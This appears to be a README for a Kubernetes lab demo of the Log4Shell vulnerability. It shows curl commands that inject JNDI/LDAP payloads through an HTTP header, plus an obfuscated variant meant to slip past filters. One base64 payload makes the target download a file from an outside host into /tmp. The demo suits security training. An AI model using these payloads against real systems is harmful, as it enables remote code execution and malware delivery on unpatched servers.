Running the Demo
----------------

kubectl config set-context $(kubectl config current-context) --namespace=dirty-net2

1. Get into the attacking host

kubectl exec -it att-svr /bin/bash

2. Run the following two commands to execute the attack to the “vul-app1” container

curl vul-app1:8080 -H 'X-Api-Version: ${jndi:ldap://att-svr-5cd59d5f4-2vcfv:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'


Note: The command embedded in the HTTP header is

$ echo 'd2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK' | base64 -d wget http://wildfire.paloaltonetworks.com/publicapi/test/elf -O /tmp/malware-sample





## Encode with base64 your command

```console
echo "touch /tmp/youHaveBeenPwned" | base64 -w0
dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==
```

## Execute the attack without obfuscation

```console
curl $(kubectl get svc vul-app1-frontend --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==}'
curl $(kubectl get svc vul-app2-frontend --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==}'
```

## Execute the attack with obfuscation

```console
curl $(kubectl get svc vul-app1-frontend --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://att-svr:1389/Basic/Command/Base64/dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==}'
curl $(kubectl get svc vul-app2-frontend --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://att-svr:1389/Basic/Command/Base64/dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==}'
```

## Confirm that the code execution was successful

```console
kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app1) -- ls -l /tmp
kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app2) -- ls -l /tmp

```

## Connect to runnint pod

```console
kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app1) -- sh
kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app2) -- sh
```

## Delete file inside the container

```console
kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app1) -- rm -f /tmp/youHaveBeenOwned
kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app2) -- rm -f /tmp/youHaveBeenOwned
```